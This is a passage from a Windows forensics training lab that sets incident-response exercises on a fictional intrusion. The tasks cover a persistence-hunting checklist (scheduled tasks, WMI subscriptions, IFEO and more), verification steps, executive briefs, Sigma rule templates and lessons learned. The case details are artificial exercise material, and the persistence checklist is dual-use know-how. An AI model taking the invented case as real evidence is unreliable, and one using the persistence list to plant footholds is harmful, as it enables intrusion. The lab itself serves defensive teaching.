| 1 | Run / RunOnce | `RECmd` over SOFTWARE + NTUSER.DAT; `Software\Microsoft\Windows\CurrentVersion\Run{,Once}` | No — enumerated, nothing attacker-authored | |
| 2 | Services | | No | |
| 3 | Scheduled Tasks | `C:\Windows\System32\Tasks\`, EID 4698; check Author field and non-Microsoft entries in Microsoft task folders | **Yes** — `\Microsoft\Windows\WindowsUpdate\WindowsUpdateSync`, author `FINANCE\payroll-admin`, created 14:22:58 | |
| 4 | WMI event subscriptions | `Get-WmiObject -Namespace root\subscription -Class __EventFilter / __EventConsumer / __FilterToConsumerBinding`; **and repeat for `root\default`** | **Yes** — `WindowsUpdateFilter` + `WindowsUpdateConsumer`, binding present, created 14:23:02 | |
| 5 | COM hijacks | | | |
| 6 | IFEO debuggers | | | |
| 7 | AppInit / AppCert DLLs | | | |
| 8 | Winlogon Shell and Userinit | | | |
| 9 | LSA and SSP providers | | | |
| 10 | Office add-ins and templates | | | |
| 11 | Startup folders | | | |
| 12 | BITS jobs | | | |
| 13 | Accessibility-tool replacements | | | |
| 14 | Attacker-installed RMM / legitimate remote access tools | | | |
| 15 | *(add any the chapter does not name that you would check)* | | | |

**Part C — The §13.5.5 verification pass.** Five bullets in the chapter. Write each as an executable step for *this* incident, with an owner and a completion criterion.

| Step | Concrete action for IR-2024-11-014 | Owner | Done when |
|---|---|---|---|
| Re-hunt full IOC set | | | |
| Re-check persistence on formerly-compromised hosts | | | |
| Positively test that the entry point is closed | | | |
| Confirm rotation actually completed | | | |
| Elevated monitoring for a defined period | | | |

Then answer:

1. Row 4 of Part B carries a warning about `root\default`. What would an analyst who enumerated only `root\subscription` have missed on a host like this one, and why is that the exact mistake an attacker would want you to make?
2. The scheduled task never executed (`LastTaskResult 0x41303`). Does a persistence mechanism that never fired still belong in the eradication checklist? Does it belong in the IOC list? Argue both.
3. Question 3 in Part A — "is the entry point closed?" — is the one this incident answers worst. State what the entry point actually was, what "closed" would mean for it, and what positive test would demonstrate it.

---

### Task 12 — Write the One-Page Executive Brief

**Objective:** Produce the document the CFO will actually read, at the length she will actually read (§13.3.1).

Go back to **17:30 UTC on 2024-11-14**. The brief is due at 18:00.

Use the §13.3.1 skeleton, reproduced in `report-templates.md` (§1). Fill every section. Enforce the page limit strictly. If it runs to two pages, it is a different document and you have failed the task.

Non-negotiables:

- The **Bottom line** is two or three sentences. A reader who stops there must not be misinformed. It must be readable by someone who does not know what an event ID is.
- **What we do not know yet** must contain the FILESVR-03 question and the `10.0.4.17` question, each with an expected time.
- **Business impact** must say "under assessment" where it is under assessment, and must not name a data category the evidence does not support.
- **Decisions needed from leadership** must contain at least one real decision with a deadline and a stated consequence of delay. An FYI is not a brief.
- No event IDs, no IP addresses, no hashes, no tool names, no filenames.
- Zero words from the §13.2.2 banned list.

Then write a second version, dated **2024-11-17**, for the same reader, using the same skeleton. The status line changes from Active to Contained. Note what moved from "do not know" to "know," and what is still open.

Then answer:

1. What did the page limit force you to cut from the 14 November brief? Name the item and state whether cutting it changed what the CFO would decide.
2. Your brief says something about payroll data. Compare that sentence against your Task 3 Confirmed and Undetermined findings. Is the plain-language version still true at the same confidence level, or did translation quietly upgrade it?
3. The 17 November version has good news in it — no other host, no other C2 traffic, containment held. Chapter §13.1.3 warns about a specific failure mode around good news and cadence. What is it, and how does your second brief avoid it?

---

### Task 13 — Close the Loop: Detection Content, Logging Gaps, Lessons Learned

**Objective:** Leave the detection posture measurably better than you found it, in specific artifacts rather than resolutions (§13.6.3, §13.6.4, §13.6.5).

**Part A — Write a Sigma rule.** Pick one behavioral finding from this case that outlives the campaign — a relationship or pattern, not an atomic indicator. Write it in the §13.6.4 format. It must have a title, a description referencing the case, a `logsource`, a `detection` block that would actually fire on the WKSTN-221 evidence, a realistic `falsepositives` entry, and a `level`.

```yaml
title:
id:
status: experimental
description:
references:
  - Internal case IR-2024-11-014
logsource:
  category:
  product: windows
detection:
  selection:
  condition: selection
falsepositives:
  -
level:
```

Then write a **second** rule for a different finding. One of your two should target the persistence mechanism the case found. The other should target something earlier in the chain. For each, state which artifact in the Case File would have made the rule fire, and at what timestamp.

**Part B — Sort the harvest.** Chapter §13.6.4 lists five output categories. Populate all five from this case.

| Category | Items from IR-2024-11-014 | Where it goes | Shelf life |
|---|---|---|---|
| Atomic indicators | | | |
| Behavioral detections | | | |
| Hunt-pack entries (generalized) | | | |
| Detection gaps (had the log, no rule) | | | |
| Logging gaps (did not have the log) | | | |

For the hunt-pack row: you built a hunt pack in Lab 09. Write the new entry in that pack's format, generalized — save the *shape* of the query, not the instance.

**Part C — Cost the logging gaps.** Chapter §13.6.5 says a gap tied to a finding gets funded and a gap presented as best practice does not. Write **three** gap entries in the §13.6.5 form. At least one must be tied to a specific Undetermined finding from Task 3 or Task 4 by number.

```markdown
**Gap L-N:** [The specific condition, with the number that makes it concrete.]
[Which findings are Undetermined or degraded as a direct result — by finding number.]
**Change:** [The specific configuration change, with the specific value.]
**Owner:** [Named team.]
**Cost:** [What it actually costs — licence, storage, engineering time, collector capacity.]
```

Candidate gaps this incident exposed, at least three of which are real:

- no memory capture capability on physical endpoints
- Security log capped at 20 MB and wrapping in ~36 hours
- no Windows Event Forwarding
- no host-level DNS query logging
- no EDR on servers
- no packet capture
- an unmanaged domain-joined host absent from the CMDB for 18 months
- flow retention of 14 days against an unknown dwell time

**Part D — The lessons-learned entry.** Use the §13.6.3 four questions. Every output gets an owner and a date — outputs without owners are not outputs. Use the skeleton in `report-templates.md` (§4).

| Question | Answer for IR-2024-11-014 | Resulting action | Owner | Due |
|---|---|---|---|---|
| What let this happen? | | | | |
| What delayed detection? | | | | |
| What slowed the response? | | | | |
| What worked, and is it repeatable? | | | | |

Then answer:

1. Question 2 — "what delayed detection?" — has a measurable answer in this case. State the interval between first attacker action and first alert, using Case File timestamps, and name the one control that would have shortened it most.
2. Chapter §13.6.3 says the fourth question gets skipped and that skipping it is how good practice fails to become standard practice. Name one thing that genuinely worked on this incident and write the action that would make it repeatable.
3. Chapter §13.6.4 says to tag every detection artifact with the case reference. That way, rules whose originating threat is long dead can be retired deliberately. Write the retirement criterion for one of your two Sigma rules — the specific condition under which a future detection engineer should turn it off.

---

## Deliverables Checklist

Your `lab13-notes.md` should contain:

- [ ] **Task 1** — Audience table for all six readers, plus three written responses
- [ ] **Task 2** — Fact / inference / assumption classification for all 10 statements, plus three written responses
- [ ] **Task 3** — Four findings, one at each confidence level, with the §13.2.2 test applied to each, plus three written responses
- [ ] **Task 4** — Three complete four-part findings, plus three written responses
- [ ] **Task 5** — The same finding for three audiences plus the HR-WS17 version for counsel, plus three written responses
- [ ] **Task 6** — Sentence-by-sentence adversarial review table, the five-question pass, the rewritten finding set, and three written responses
- [ ] **Task 7** — Containment ranking (Part A), evidence cost (Part B), sequenced action list (Part C), plus four written responses
- [ ] **Task 8** — Containment decision records for WKSTN-221 and FILESVR-03, plus three written responses
- [ ] **Task 9** — Rebuild-or-clean scoring for three live hosts plus HR-WS17, with justifications, plus three written responses
- [ ] **Task 10** — Credential rotation sequence (Part A), the three specific decisions (Part B), plus three written responses
- [ ] **Task 11** — Three eradication questions with confidence levels, the full persistence checklist, the verification pass, plus three written responses
- [ ] **Task 12** — Executive brief for 14 November and 17 November, both within one page, plus three written responses
- [ ] **Task 13** — Two Sigma rules, the five-category harvest table, three costed logging gaps, the lessons-learned entry, plus three written responses

---

## Files in This Folder

```
Lab13/
├── ReadMe.md              ← This file — the end-to-end run
├── lab13-notes.md         ← Your working notes file (fill this in)
├── report-templates.md    ← Copy-into-your-case-folder skeletons: executive brief,
│                            incident report, containment decision record,
│                            lessons-learned entry. Reusable on real cases.
├── task-answers.md        ← Model answers for Tasks 1–13. Write yours first.
├── Lab13_01/              ← §13.1 Writing for the Audience That Has to Act
├── Lab13_02/              ← §13.2 The Anatomy of a Defensible Finding
├── Lab13_03/              ← §13.3 Report Structures That Work
├── Lab13_04/              ← §13.4 Containment Without Destroying Evidence
├── Lab13_05/              ← §13.5 Eradication and the Reinfection Question
└── Lab13_06/              ← §13.6 Recovery, Lessons Learned, Detection Feedback
```

The six sub-exercises drill one chapter section each. If you work only one,
work `Lab13_02`. Writing a finding at a stated confidence level is the skill
that carries into every case you will ever run.

---

> **Going deeper:** The eradication and rotation steps in Tasks 10 and 11 touch material the main chapters reference but do not develop. `Book/AppendixA.md` (Lateral Movement, Credential Abuse, and Active Directory) covers the artifact side of `krbtgt` rotation, Golden Ticket indicators, and the domain-side event IDs that would tell you whether the 14:33 explicit-credential logon went further than FILESVR-03. `Book/AppendixB.md` (Cloud Identity and M365 Forensics) covers category 7 of the rotation list. Refresh-token revocation in Entra ID is a separate action from a password reset, and it is the most commonly skipped step in credential rotation. `Book/AppendixC.md` (EDR Platforms and Sysmon) covers translating the Sigma rules you write in Task 13 into the EDR and SIEM query languages your organization actually runs. It also gives the Sysmon event IDs (1, 3, 19/20/21 for WMI subscriptions) your Part A rules should target where Security-log auditing does not reach. For a one-page condensation of every artifact path, event ID, and logon type referenced in this lab's Case File, see `Book/AppendixE.md`.

---

## Key Takeaways

- **The report is the deliverable, not the investigation.** A perfect timeline that sits in a case folder while leadership makes an uninformed disclosure decision is a failed engagement, no matter how good the forensics were.
- **Confidence language only works if it is defined and used consistently.** Four levels, published inside the report, one level per finding. "Likely" means whatever the reader wants it to mean.
- **Undetermined is a finding.** It goes in the report with the named missing source and the reason it was unavailable. Omitting the row tells the reader nothing and implies you did not look.
- **Read direction, not totals.** The single most consequential error available in this case is reading a byte count without reading which way it went. Every finding about data movement lives or dies on that.
- **Every containment action destroys evidence.** You are never choosing whether to accept a loss, only which loss — and whether you chose it deliberately and wrote down why.
- **Rebuild is the default. Cleaning is the exception that needs justification.** Rebuilding from a trusted image is an assessment that does not depend on the completeness of your investigation. That is precisely what makes it safer than your own confidence.
- **Eradication is verified, not declared.** All persistence found, all reachable credentials rotated in dependency order, entry point closed with a positive test — each with a confidence level attached.
- **The Undetermined rows in your report are next year's detection roadmap.** A logging gap tied to a specific finding gets funded. The same gap presented as general best practice does not, and the window in which the organization will act on it closes fast.

---

**Next:** Chapter 14 — Conclusion and Next Steps

*Part of the [Windows Forensics for Beginners](https://github.com/zach115th/Windows-Forensics-for-Beginners) lab series.*

---
